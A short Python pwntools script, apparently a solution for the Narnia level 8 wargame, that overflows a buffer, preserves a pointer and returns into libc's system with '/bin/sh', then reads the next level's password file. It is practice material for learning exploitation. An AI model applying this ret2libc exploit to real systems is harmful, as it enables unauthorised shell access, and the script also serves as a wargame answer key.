from pwn import *

# argv is blah's address (see the code) - needs to be preserved in the overwrite. 
# it decreases based on total length of the payload. to determine the initial value outside of gdb (its different)
# run narnia8 with 20 characters and feed into a txt file, then examine with xxd. sub decimal 20 (0x14) from the result 
# to get the target value

argv = 0xffffd87a 
libc_base = 0xf7e12000  # ldd /narnia/narnia8
system = 0x3a850        # readelf -s /lib32/libc.so.6 | grep system
binsh = 0x15ccc8        # strings -a -t x /lib32/libc.so.6 | grep /bin/sh

payload = flat(
    b'A'*20,
    argv,
    b'BBBB',
    libc_base + system, # overwriting prior return address with system's location
    b'CCCC', # return address for system - doesnt matter
    libc_base + binsh, # pointer to the string arg for system
)

p = process([b'/narnia/narnia8', payload])
p.clean()
p.sendline(b'cat /etc/narnia_pass/narnia9')
print('\nnarnia9 pass: ' + p.recvline().decode())
p.close()